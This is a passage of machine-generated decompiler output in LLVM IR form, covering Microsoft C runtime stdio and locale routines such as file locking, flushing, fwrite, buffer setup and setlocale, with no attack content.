  store i32 %51, i32* %edi.1.reg2mem, !insn.addr !8887
  br label %dec_label_pc_10018731, !insn.addr !8887

dec_label_pc_10018731:                            ; preds = %dec_label_pc_10018709, %dec_label_pc_100186f6
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %52 = add i32 %esi.01.reload, 4, !insn.addr !8888
  store i32 %52, i32* %17, align 4, !insn.addr !8866
  %53 = icmp eq i32 %52, %20, !insn.addr !8867
  store i32 %edi.1.reload, i32* %edi.02.reg2mem, !insn.addr !8868
  store i32 %52, i32* %esi.01.reg2mem, !insn.addr !8868
  br i1 %53, label %dec_label_pc_10018736, label %dec_label_pc_100186f6, !insn.addr !8868

dec_label_pc_10018736:                            ; preds = %dec_label_pc_10018731, %dec_label_pc_100186c3
  store i32 -2, i32* %9, align 4, !insn.addr !8889
  %54 = call i32 @function_1001874a(), !insn.addr !8890
  %55 = call i32 @__SEH_epilog4(), !insn.addr !8891
  ret i32 %55, !insn.addr !8892
}

define i32 @function_1001874a() local_unnamed_addr {
dec_label_pc_1001874a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8893
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8893
  %3 = load i32, i32* %2, align 4, !insn.addr !8893
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8894
  %5 = load i32, i32* %4, align 4, !insn.addr !8894
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !8895
  ret i32 %6, !insn.addr !8896
}

define i32 @function_10018756(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10018756:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b8e8, i32 12), !insn.addr !8897
  %2 = add i32 %0, -28, !insn.addr !8898
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8898
  store i32 0, i32* %3, align 4, !insn.addr !8898
  %4 = add i32 %0, 8, !insn.addr !8899
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8899
  %6 = load i32, i32* %5, align 4, !insn.addr !8899
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8900
  %8 = load i32, i32* %7, align 4, !insn.addr !8900
  %9 = call i32 @__lock_file(i32 %8), !insn.addr !8901
  %10 = add i32 %0, -4, !insn.addr !8902
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8902
  store i32 0, i32* %11, align 4, !insn.addr !8902
  %12 = add i32 %0, 12, !insn.addr !8903
  %13 = inttoptr i32 %12 to i32*, !insn.addr !8903
  %14 = load i32, i32* %13, align 4, !insn.addr !8903
  %15 = inttoptr i32 %14 to i32*, !insn.addr !8904
  %16 = load i32, i32* %15, align 4, !insn.addr !8904
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8905
  %18 = load i32, i32* %17, align 4, !insn.addr !8905
  %19 = call i32 @__fflush_nolock(i32 %18), !insn.addr !8906
  store i32 %19, i32* %3, align 4, !insn.addr !8907
  store i32 -2, i32* %11, align 4, !insn.addr !8908
  %20 = call i32 @function_100187a0(), !insn.addr !8909
  %21 = call i32 @__SEH_epilog4(), !insn.addr !8910
  ret i32 %21, !insn.addr !8911
}

define i32 @function_100187a0() local_unnamed_addr {
dec_label_pc_100187a0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8912
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8912
  %3 = load i32, i32* %2, align 4, !insn.addr !8912
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8913
  %5 = load i32, i32* %4, align 4, !insn.addr !8913
  %6 = call i32 @__lock_file.13(i32 %5), !insn.addr !8914
  ret i32 %6, !insn.addr !8915
}

define void @"??$__acrt_lock_and_call@V<lambda_ab61a845afdef5b7c387490eaf3616ee>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_ab61a845afdef5b7c387490eaf3616ee>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100187ac:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !8916
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !8917
  %2 = call i32 @function_100186c3(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !8918
  ret void, !insn.addr !8919
}

define i32 @function_100187d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100187d4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !8920
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !8921
  %1 = call i32 @function_10018642(i32* nonnull %stack_var_-16, i32 %arg2, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !8922
  ret i32 %1, !insn.addr !8923
}

define i32 @"??$__acrt_lock_stream_and_call@V<lambda_9a32fed5bf61b6b509b2d3f6003082a1>@@@@YAHQAU_iobuf@@$$QAV<lambda_9a32fed5bf61b6b509b2d3f6003082a1>@@@Z"(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100187fc:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %2, i32* %stack_var_-12, align 4, !insn.addr !8924
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !8925
  %3 = call i32 @function_10018756(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %2, i32 %2, i32 %0), !insn.addr !8926
  ret i32 %3, !insn.addr !8927
}

declare i32 @"?common_flush_all@@YAH_N@Z"(i1) local_unnamed_addr

declare i32 @"?common_flush_all_should_try_to_flush_stream@@YA_NV__crt_stdio_stream@@QAH@Z"(i32, i32*) local_unnamed_addr

declare i32 @___acrt_stdio_flush_nolock(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__fflush_nolock(i32) local_unnamed_addr

define i32 @__flushall(i1 %arg1) local_unnamed_addr {
dec_label_pc_10018962:
  %0 = call i32 @"?common_flush_all@@YAH_N@Z"(i1 %arg1), !insn.addr !8928
  ret i32 %0, !insn.addr !8929
}

declare i32 @_fgetc(%_IO_FILE*) local_unnamed_addr

define i32 @function_10018ae2() local_unnamed_addr {
dec_label_pc_10018ae2:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -32, !insn.addr !8930
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8930
  %3 = load i32, i32* %2, align 4, !insn.addr !8930
  %4 = call i32 @__lock_file.13(i32 %3), !insn.addr !8931
  ret i32 %4, !insn.addr !8932
}

define i32 @function_10018c6c() local_unnamed_addr {
dec_label_pc_10018c6c:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__lock_file.13(i32 %0), !insn.addr !8933
  ret i32 %1, !insn.addr !8934
}

define i32 @function_10018caf(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10018caf:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b948, i32 12), !insn.addr !8935
  %2 = add i32 %0, -28, !insn.addr !8936
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8936
  store i32 0, i32* %3, align 4, !insn.addr !8936
  %4 = add i32 %0, 8, !insn.addr !8937
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8937
  %6 = load i32, i32* %5, align 4, !insn.addr !8937
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8938
  %8 = load i32, i32* %7, align 4, !insn.addr !8938
  %9 = call i32 @__lock_file(i32 %8), !insn.addr !8939
  %10 = add i32 %0, -4, !insn.addr !8940
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8940
  store i32 0, i32* %11, align 4, !insn.addr !8940
  %12 = call i32 @function_10018d28(), !insn.addr !8941
  store i32 %12, i32* %3, align 4, !insn.addr !8942
  store i32 -2, i32* %11, align 4, !insn.addr !8943
  %13 = call i32 @function_10018cf4(), !insn.addr !8944
  %14 = call i32 @__SEH_epilog4(), !insn.addr !8945
  ret i32 %14, !insn.addr !8946
}

define i32 @function_10018cf4() local_unnamed_addr {
dec_label_pc_10018cf4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8947
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8947
  %3 = load i32, i32* %2, align 4, !insn.addr !8947
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8948
  %5 = load i32, i32* %4, align 4, !insn.addr !8948
  %6 = call i32 @__lock_file.13(i32 %5), !insn.addr !8949
  ret i32 %6, !insn.addr !8950
}

define i32 @"??$__acrt_lock_stream_and_call@V<lambda_54dcfcba6f8e0c549fa430f4d53fb7dd>@@@@YAIQAU_iobuf@@$$QAV<lambda_54dcfcba6f8e0c549fa430f4d53fb7dd>@@@Z"(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10018d00:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %2, i32* %stack_var_-12, align 4, !insn.addr !8951
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !8952
  %3 = call i32 @function_10018caf(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %2, i32 %2, i32 %0), !insn.addr !8953
  ret i32 %3, !insn.addr !8954
}

define i32 @function_10018d28() local_unnamed_addr {
dec_label_pc_10018d28:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @___acrt_stdio_begin_temporary_buffering_nolock(i32 %2, i32 %0, i32 %1), !insn.addr !8955
  %4 = add i32 %2, 12, !insn.addr !8956
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8956
  %6 = load i32, i32* %5, align 4, !insn.addr !8956
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8957
  %8 = load i32, i32* %7, align 4, !insn.addr !8957
  %9 = add i32 %2, 8, !insn.addr !8958
  %10 = inttoptr i32 %9 to i32*, !insn.addr !8958
  %11 = load i32, i32* %10, align 4, !insn.addr !8958
  %12 = inttoptr i32 %11 to i32*, !insn.addr !8959
  %13 = load i32, i32* %12, align 4, !insn.addr !8959
  %14 = add i32 %2, 4, !insn.addr !8960
  %15 = inttoptr i32 %14 to i32*, !insn.addr !8960
  %16 = load i32, i32* %15, align 4, !insn.addr !8960
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8961
  %18 = load i32, i32* %17, align 4, !insn.addr !8961
  %19 = call i32 @__fwrite_nolock(i32 %18, i32 %13, i32 %8, i32 %2), !insn.addr !8962
  %20 = trunc i32 %3 to i8, !insn.addr !8963
  %21 = call i32 @___acrt_stdio_end_temporary_buffering_nolock(i8 %20, i32 %2), !insn.addr !8964
  ret i32 %19, !insn.addr !8965
}

declare i32 @__fwrite_nolock(i32, i32, i32, i32) local_unnamed_addr

declare i32 @_fwrite(i32*, i32, i32, %_IO_FILE*) local_unnamed_addr

define i32 @function_10018f3f(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10018f3f:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b968, i32 12), !insn.addr !8966
  %2 = add i32 %0, -28, !insn.addr !8967
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8967
  store i32 0, i32* %3, align 4, !insn.addr !8967
  %4 = add i32 %0, 8, !insn.addr !8968
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8968
  %6 = load i32, i32* %5, align 4, !insn.addr !8968
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8969
  %8 = load i32, i32* %7, align 4, !insn.addr !8969
  %9 = call i32 @__lock_file(i32 %8), !insn.addr !8970
  %10 = add i32 %0, -4, !insn.addr !8971
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8971
  store i32 0, i32* %11, align 4, !insn.addr !8971
  %12 = call i32 @function_10018fb8(), !insn.addr !8972
  store i32 %12, i32* %3, align 4, !insn.addr !8973
  store i32 -2, i32* %11, align 4, !insn.addr !8974
  %13 = call i32 @function_10018f84(), !insn.addr !8975
  %14 = call i32 @__SEH_epilog4(), !insn.addr !8976
  ret i32 %14, !insn.addr !8977
}

define i32 @function_10018f84() local_unnamed_addr {
dec_label_pc_10018f84:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8978
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8978
  %3 = load i32, i32* %2, align 4, !insn.addr !8978
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8979
  %5 = load i32, i32* %4, align 4, !insn.addr !8979
  %6 = call i32 @__lock_file.13(i32 %5), !insn.addr !8980
  ret i32 %6, !insn.addr !8981
}

define i32 @"??$__acrt_lock_stream_and_call@V<lambda_ca71763b3c0644891230e4f79ea54fa6>@@@@YAHQAU_iobuf@@$$QAV<lambda_ca71763b3c0644891230e4f79ea54fa6>@@@Z"(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10018f90:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %2, i32* %stack_var_-12, align 4, !insn.addr !8982
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !8983
  %3 = call i32 @function_10018f3f(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %2, i32 %2, i32 %0), !insn.addr !8984
  ret i32 %3, !insn.addr !8985
}

define i32 @function_10018fb8() local_unnamed_addr {
dec_label_pc_10018fb8:
  %storemerge.reg2mem = alloca i32, !insn.addr !8986
  %stack_var_-16.1.reg2mem = alloca i32, !insn.addr !8986
  %stack_var_-24.0.in.reg2mem = alloca i32, !insn.addr !8986
  %stack_var_-20.1.reg2mem = alloca i32, !insn.addr !8986
  %storemerge3.reg2mem = alloca i32, !insn.addr !8986
  %storemerge2.in.reg2mem = alloca i32, !insn.addr !8986
  %stack_var_-16.0.reg2mem = alloca i32, !insn.addr !8986
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = add i32 %3, 4, !insn.addr !8987
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8987
  %6 = load i32, i32* %5, align 4, !insn.addr !8987
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8988
  %8 = load i32, i32* %7, align 4, !insn.addr !8988
  %9 = call i32 @___acrt_stdio_flush_nolock(i32 %8, i32 %0, i32 %1, i32 %2), !insn.addr !8989
  %10 = load i32, i32* %5, align 4, !insn.addr !8990
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8991
  %12 = load i32, i32* %11, align 4, !insn.addr !8991
  %13 = call i32 @___acrt_stdio_free_buffer_nolock(i32 %12), !insn.addr !8992
  %14 = load i32, i32* %5, align 4, !insn.addr !8993
  %15 = inttoptr i32 %14 to i32*, !insn.addr !8994
  %16 = load i32, i32* %15, align 4, !insn.addr !8994
  %17 = add i32 %16, 12, !insn.addr !8995
  %18 = inttoptr i32 %17 to i32*, !insn.addr !8996
  %19 = load i32, i32* %18, align 4, !insn.addr !8996
  %20 = and i32 %19, -2017, !insn.addr !8996
  store i32 %20, i32* %18, align 4, !insn.addr !8996
  %21 = add i32 %3, 8, !insn.addr !8997
  %22 = inttoptr i32 %21 to i32*, !insn.addr !8997
  %23 = load i32, i32* %22, align 4, !insn.addr !8997
  %24 = inttoptr i32 %23 to i8*, !insn.addr !8998
  %25 = load i8, i8* %24, align 1, !insn.addr !8998
  %26 = and i8 %25, 4, !insn.addr !8998
  %27 = icmp eq i8 %26, 0, !insn.addr !8998
  br i1 %27, label %dec_label_pc_10019008, label %dec_label_pc_10018ff4, !insn.addr !8999

dec_label_pc_10018ff4:                            ; preds = %dec_label_pc_10018fb8
  %28 = load i32, i32* %5, align 4, !insn.addr !9000
  %29 = inttoptr i32 %28 to i32*
  %30 = load i32, i32* %29, align 4, !insn.addr !9001
  %31 = add i32 %30, 20, !insn.addr !9002
  store i32 %30, i32* %storemerge3.reg2mem, !insn.addr !9003
  store i32 2, i32* %stack_var_-20.1.reg2mem, !insn.addr !9003
  store i32 %31, i32* %stack_var_-24.0.in.reg2mem, !insn.addr !9003
  store i32 1024, i32* %stack_var_-16.1.reg2mem, !insn.addr !9003
  br label %dec_label_pc_10019046, !insn.addr !9003

dec_label_pc_10019008:                            ; preds = %dec_label_pc_10018fb8
  %32 = add i32 %3, 12, !insn.addr !9004
  %33 = inttoptr i32 %32 to i32*, !insn.addr !9004
  %34 = load i32, i32* %33, align 4, !insn.addr !9004
  %35 = inttoptr i32 %34 to i32*, !insn.addr !9005
  %36 = load i32, i32* %35, align 4, !insn.addr !9005
  %37 = icmp eq i32 %36, 0, !insn.addr !9006
  %38 = icmp eq i1 %37, false, !insn.addr !9007
  store i32 384, i32* %stack_var_-16.0.reg2mem, !insn.addr !9007
  store i32 %36, i32* %storemerge2.in.reg2mem, !insn.addr !9007
  br i1 %38, label %dec_label_pc_10019041, label %dec_label_pc_10019011, !insn.addr !9007

dec_label_pc_10019011:                            ; preds = %dec_label_pc_10019008
  %39 = call i32 @__malloc_base(), !insn.addr !9008
  %40 = call i32 @__free_base(i32 0), !insn.addr !9009
  %41 = icmp eq i32 %39, 0, !insn.addr !9010
  %42 = icmp eq i1 %41, false, !insn.addr !9011
  store i32 320, i32* %stack_var_-16.0.reg2mem, !insn.addr !9011
  store i32 %39, i32* %storemerge2.in.reg2mem, !insn.addr !9011
  br i1 %42, label %dec_label_pc_10019041, label %dec_label_pc_10019026, !insn.addr !9011

dec_label_pc_10019026:                            ; preds = %dec_label_pc_10019011
  %43 = load i32, i32* @global_var_1003e65c, align 4, !insn.addr !9012
  %44 = add i32 %43, 1, !insn.addr !9012
  store i32 %44, i32* @global_var_1003e65c, align 4, !insn.addr !9012
  store i32 -1, i32* %storemerge.reg2mem, !insn.addr !9013
  br label %dec_label_pc_1001904e, !insn.addr !9013

dec_label_pc_10019041:                            ; preds = %dec_label_pc_10019008, %dec_label_pc_10019011
  %45 = and i32 %3, -2, !insn.addr !9014
  %storemerge2.in.reload = load i32, i32* %storemerge2.in.reg2mem
  %stack_var_-16.0.reload = load i32, i32* %stack_var_-16.0.reg2mem
  %46 = load i32, i32* %5, align 4, !insn.addr !9015
  %storemerge3.in.phi.trans.insert = inttoptr i32 %46 to i32*
  %storemerge3.pre = load i32, i32* %storemerge3.in.phi.trans.insert, align 4
  store i32 %storemerge3.pre, i32* %storemerge3.reg2mem, !insn.addr !9016
  store i32 %45, i32* %stack_var_-20.1.reg2mem, !insn.addr !9016
  store i32 %storemerge2.in.reload, i32* %stack_var_-24.0.in.reg2mem, !insn.addr !9016
  store i32 %stack_var_-16.0.reload, i32* %stack_var_-16.1.reg2mem, !insn.addr !9016
  br label %dec_label_pc_10019046, !insn.addr !9016

dec_label_pc_10019046:                            ; preds = %dec_label_pc_10019041, %dec_label_pc_10018ff4
  %stack_var_-16.1.reload = load i32, i32* %stack_var_-16.1.reg2mem
  %stack_var_-24.0.in.reload = load i32, i32* %stack_var_-24.0.in.reg2mem
  %stack_var_-20.1.reload = load i32, i32* %stack_var_-20.1.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %stack_var_-24.0 = inttoptr i32 %stack_var_-24.0.in.reload to i8*
  %47 = call i32 @"?set_buffer@@YAHV__crt_stdio_stream@@QADIH@Z"(i32 %storemerge3.reload, i8* %stack_var_-24.0, i32 %stack_var_-20.1.reload, i32 %stack_var_-16.1.reload), !insn.addr !9017
  store i32 %47, i32* %storemerge.reg2mem, !insn.addr !9018
  br label %dec_label_pc_1001904e, !insn.addr !9018

dec_label_pc_1001904e:                            ; preds = %dec_label_pc_10019046, %dec_label_pc_10019026
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  ret i32 %storemerge.reload, !insn.addr !9019
}

declare i32 @"?set_buffer@@YAHV__crt_stdio_stream@@QADIH@Z"(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @_ungetc(i32, %_IO_FILE*) local_unnamed_addr

define i32 @function_10019252() local_unnamed_addr {
dec_label_pc_10019252:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__lock_file.13(i32 %0), !insn.addr !9020
  ret i32 %1, !insn.addr !9021
}

define i32 @function_1001925a(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001925a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b9a8, i32 12), !insn.addr !9022
  %2 = add i32 %0, -28, !insn.addr !9023
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9023
  store i32 0, i32* %3, align 4, !insn.addr !9023
  %4 = add i32 %0, 8, !insn.addr !9024
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9024
  %6 = load i32, i32* %5, align 4, !insn.addr !9024
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9025
  %8 = load i32, i32* %7, align 4, !insn.addr !9025
  %9 = call i32 @___acrt_lock(i32 %8), !insn.addr !9026
  %10 = add i32 %0, -4, !insn.addr !9027
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9027
  store i32 0, i32* %11, align 4, !insn.addr !9027
  %12 = call i32 @function_100192d3(), !insn.addr !9028
  store i32 %12, i32* %3, align 4, !insn.addr !9029
  store i32 -2, i32* %11, align 4, !insn.addr !9030
  %13 = call i32 @function_1001929f(), !insn.addr !9031
  %14 = call i32 @__SEH_epilog4(), !insn.addr !9032
  ret i32 %14, !insn.addr !9033
}

define i32 @function_1001929f() local_unnamed_addr {
dec_label_pc_1001929f:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9034
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9034
  %3 = load i32, i32* %2, align 4, !insn.addr !9034
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9035
  %5 = load i32, i32* %4, align 4, !insn.addr !9035
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9036
  ret i32 %6, !insn.addr !9037
}

define i8* @"??$__acrt_lock_and_call@V<lambda_082c17da81b0962e08c0587ee0fac50c>@@@@YAPADW4__acrt_lock_id@@$$QAV<lambda_082c17da81b0962e08c0587ee0fac50c>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100192ab:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9038
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9039
  %2 = call i32 @function_1001925a(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9040
  %3 = inttoptr i32 %2 to i8*, !insn.addr !9041
  ret i8* %3, !insn.addr !9041
}

define i32 @function_100192d3() local_unnamed_addr {
dec_label_pc_100192d3:
  %eax.1.reg2mem = alloca i32, !insn.addr !9042
  %ecx.0.reg2mem = alloca i32, !insn.addr !9042
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-1 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %3 = add i32 %2, 4, !insn.addr !9043
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9043
  %5 = load i32, i32* %4, align 4, !insn.addr !9043
  %6 = inttoptr i32 %5 to i32*, !insn.addr !9044
  %7 = load i32, i32* %6, align 4, !insn.addr !9044
  %8 = call i32 @_call_wsetlocale(i32 %2, i32 %7, i32 %0, i32 %1), !insn.addr !9045
  %9 = icmp eq i32 %8, 0, !insn.addr !9046
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !9047
  br i1 %9, label %dec_label_pc_1001942c, label %dec_label_pc_100192f9, !insn.addr !9047

dec_label_pc_100192f9:                            ; preds = %dec_label_pc_100192d3
  %10 = call i32 @___acrt_getptd(), !insn.addr !9048
  %11 = add i32 %10, 76, !insn.addr !9049
  %12 = inttoptr i32 %11 to i32*, !insn.addr !9049
  %13 = load i32, i32* %12, align 4, !insn.addr !9049
  store i32 %13, i32* %stack_var_-20, align 4, !insn.addr !9050
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !9051
  %14 = call i32 @__wcstombs_s_l(i32* nonnull %stack_var_-8, i32 0, i32 0, i32 %8, i32 0, i32* nonnull %stack_var_-20), !insn.addr !9052
  switch i32 %14, label %dec_label_pc_10019334 [
    i32 0, label %dec_label_pc_1001933e
    i32 22, label %dec_label_pc_10019437
  ]

dec_label_pc_10019334:                            ; preds = %dec_label_pc_100192f9
  %15 = icmp eq i32 %14, 34, !insn.addr !9053
  %16 = icmp eq i1 %15, false, !insn.addr !9054
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !9054
  br i1 %16, label %dec_label_pc_1001942c, label %dec_label_pc_10019437, !insn.addr !9054

dec_label_pc_1001933e:                            ; preds = %dec_label_pc_100192f9
  %17 = call i32 @__malloc_base(), !insn.addr !9055
  %18 = icmp eq i32 %17, 0, !insn.addr !9056
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !9057
  br i1 %18, label %dec_label_pc_1001942c, label %dec_label_pc_10019351, !insn.addr !9057

dec_label_pc_10019351:                            ; preds = %dec_label_pc_1001933e
  %19 = load i32, i32* %stack_var_-8, align 4, !insn.addr !9058
  %20 = add i32 %17, 4, !insn.addr !9059
  %21 = call i32 @__wcstombs_s_l(i32* null, i32 %20, i32 %19, i32 %8, i32 -1, i32* nonnull %stack_var_-20), !insn.addr !9060
  switch i32 %21, label %dec_label_pc_10019378 [
    i32 0, label %dec_label_pc_10019390
    i32 34, label %dec_label_pc_10019437
    i32 22, label %dec_label_pc_10019437
  ]

dec_label_pc_10019378:                            ; preds = %dec_label_pc_10019351
  %22 = call i32 @__free_base(i32 %17), !insn.addr !9061
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !9062
  br label %dec_label_pc_1001942c, !insn.addr !9062

dec_label_pc_10019390:                            ; preds = %dec_label_pc_10019351
  %23 = ptrtoint i32* %stack_var_-1 to i32, !insn.addr !9063
  %24 = load i32, i32* %stack_var_-20, align 4, !insn.addr !9064
  %25 = mul i32 %23, 16, !insn.addr !9065
  %26 = add i32 %24, 36, !insn.addr !9065
  %27 = add i32 %26, %25, !insn.addr !9065
  %28 = inttoptr i32 %27 to i32*, !insn.addr !9065
  %29 = load i32, i32* %28, align 4, !insn.addr !9065
  %30 = icmp eq i32 %29, 0, !insn.addr !9066
  store i32 %23, i32* %ecx.0.reg2mem, !insn.addr !9067
  br i1 %30, label %dec_label_pc_100193ca, label %dec_label_pc_100193a4, !insn.addr !9067

dec_label_pc_100193a4:                            ; preds = %dec_label_pc_10019390
  %31 = inttoptr i32 %29 to i32*, !insn.addr !9068
  %32 = load i32, i32* %31, align 4, !insn.addr !9068
  %33 = add i32 %32, %23, !insn.addr !9068
  %34 = icmp eq i32 %33, 0, !insn.addr !9068
  store i32 %33, i32* %31, align 4, !insn.addr !9068
  %35 = icmp eq i1 %34, false, !insn.addr !9069
  store i32 %23, i32* %ecx.0.reg2mem, !insn.addr !9069
  br i1 %35, label %dec_label_pc_100193ca, label %dec_label_pc_100193ac, !insn.addr !9069

dec_label_pc_100193ac:                            ; preds = %dec_label_pc_100193a4
  %36 = load i32, i32* %28, align 4, !insn.addr !9070
  %37 = call i32 @__free_base(i32 %36), !insn.addr !9071
  %38 = mul i32 %36, 16, !insn.addr !9072
  %39 = add i32 %38, %26, !insn.addr !9072
  %40 = inttoptr i32 %39 to i32*, !insn.addr !9072
  store i32 0, i32* %40, align 4, !insn.addr !9072
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !9073
  br label %dec_label_pc_100193ca, !insn.addr !9073

dec_label_pc_100193ca:                            ; preds = %dec_label_pc_100193ac, %dec_label_pc_100193a4, %dec_label_pc_10019390
  %41 = add i32 %10, 848, !insn.addr !9074
  %42 = inttoptr i32 %41 to i8*, !insn.addr !9074
  %43 = load i8, i8* %42, align 1, !insn.addr !9074
  %44 = and i8 %43, 2, !insn.addr !9074
  %45 = icmp eq i8 %44, 0, !insn.addr !9074
  %46 = icmp eq i1 %45, false, !insn.addr !9075
  br i1 %46, label %dec_label_pc_1001940f, label %dec_label_pc_100193d6, !insn.addr !9075

